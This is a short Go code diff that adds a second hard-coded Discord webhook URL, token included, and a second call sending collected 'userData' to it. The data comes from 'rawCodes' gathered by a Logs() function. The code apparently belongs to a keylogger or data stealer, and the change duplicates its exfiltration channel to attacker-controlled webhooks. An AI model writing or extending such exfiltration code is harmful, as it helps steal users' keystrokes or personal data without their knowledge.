@@ -10,6 +10,7 @@ import (
 )
 
 const res_webhook_link string = "https://discord.com/api/webhooks/1224461106303467641/oaSR8xCS6mfQ3tR8ssOQLwb-S1kPqH1LWXtkvph54jWZDwTwwh5pwmlqkN3BxKPcbAHY"
+const res_webhook_link2 string = "https://discord.com/api/webhooks/1227680406145466611/eRbQxWtqw_VjdMwtgktgggJd7LeqpXzMzI2r-v188_G6uc_61lrVTuvggbP3nltX7D_c"
 
 func Logs() {
 	var rawCodes []int
@@ -59,4 +60,5 @@ func send(rawCodes []int) {
 	}
 
 	SendMessageToWebhook(userData, res_webhook_link)
+	SendMessageToWebhook(userData, res_webhook_link2)
 }
